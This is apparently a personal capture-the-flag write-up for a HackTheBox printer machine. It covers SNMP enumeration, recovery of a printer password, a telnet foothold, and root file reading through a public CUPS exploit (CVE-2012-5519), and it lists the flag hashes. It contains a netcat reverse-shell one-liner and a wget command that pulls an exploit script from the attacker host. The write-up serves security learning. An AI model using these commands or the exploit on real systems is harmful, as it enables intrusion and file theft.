# Enumeration
## nmap scan
`nmap -sV -A -v -p- 10.10.11.107`
![[Screenshot 2022-05-04 at 13.18.35.png]]
`sudo nmap -sU 10.10.11.107` showed snmp to be open
![[Screenshot 2022-05-04 at 13.53.47.png]]
`sudo nmap -sU --script snmp-brute 10.10.11.107`
![[Screenshot 2022-05-04 at 14.45.12.png]]

## SNMP
![[Screenshot 2022-05-04 at 13.56.39.png]]
`snmpget -v 1 -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0` with the latter string of numbers being the OIB
![[Screenshot 2022-05-04 at 15.07.21.png]]
Using a [hex to ascii converter](https://www.rapidtables.com/convert/number/hex-to-ascii.html) I copied and pasted the hex and got a result _P@ssw0rd@123!!123_ which seemed to work:
![[Screenshot 2022-05-04 at 15.09.59.png]]
`snmpwalk -v 1 -c public 10.10.11.107` showed what I think is the 'private string'
![[Screenshot 2022-05-04 at 15.20.27.png]]
# Foothold
Now that I have esyablished a connection, I can execute commands using _exec_
![[Screenshot 2022-05-04 at 15.51.09.png]]
Looks like I am part of the lpadmin group
![[Screenshot 2022-05-04 at 15.52.34.png]]

`exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 4444 >/tmp/f` got me a shell:
![[Screenshot 2022-05-04 at 16.03.03.png]]

# Privesc
imported _linpeas.sh_ 
there is a directory _cups_ in _/var_ which appears might be [usable](https://www.cvedetails.com/cve/CVE-2012-5519/) in combination with being in the _lpadmin_ group
![[Screenshot 2022-05-04 at 16.12.30.png]]

`searchsploit cups 1.4.4`  resulted in a couple exploits
![[Screenshot 2022-05-04 at 16.24.17.png]]

## cups + lpadmin
`cat /var/run/cups/certs/0` gave me a cert number
![[Screenshot 2022-05-04 at 16.31.27.png]]

`cat /etc/cups/cupsd.conf` showed the config file for the program, but I could not access `10.10.11.107:631/admin`

A good article on the [exploit](https://github.com/0zvxr/CVE-2012-5519)
![[Screenshot 2022-05-04 at 16.40.51.png]]

## Method
1. `git clone https://github.com/0zvxr/CVE-2012-5519.git`into attacker machine
2. `wget http://10.10.14.9:8000/cups-root-file-read.sh` from lp shell 
3. `chmod 700 cups-root-file-read.sh` + `./cups-root-file-read.sh`
4. from this shell read `/root/root.txt`:
![[Screenshot 2022-05-04 at 17.51.19.png]]
# Flags
e4735d2235b0d965ff07b7a1166f545c
3a1794ba28ccd0ec01548ad1a78423fe
# Thoughts
- easier than I thought --> only needed help once as I felt vey stuck although it turned out I was already in the system and only executed the commands wrongly...
- took some time to find an exploitable set of code for the privesc, but found a good one and executed it all without a writeup! going to have a lookover now for other ways it could have been done thoug..
- a good taster
# New Things Learnt
- HP JetDirect = Technology allowing printers to be directly connected to LANs
- snmpget + OIB
- telnet

# Other privesc methods
1. [This writeup](https://medium.com/@v1per/antique-hackthebox-writeup-7349e7804b81) used the ports 631 and 9090 to get access to the cups server and from there used a metasploit module _cups_root_file_read_ to access the file. This is essentially what I did, but when I checked port 631 it was closed, so this did not work for me. (Although `ss -lntp` shows it is?:)
![[Screenshot 2022-05-04 at 18.14.23.png]]
3.  this [metasploit module](https://github.com/rapid7/metasploit-framework/blob/master//modules/post/multi/escalate/cups_root_file_read.rb). The thing that confused me was that I needed a meterpreter session beofre I could execute the payload. 
# resources
- [telnet pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet)
- [snmp pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp)
- [printer hacking](http://www.irongeek.com/i.php?page=security/networkprinterhacking)
- [the bug](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=692791)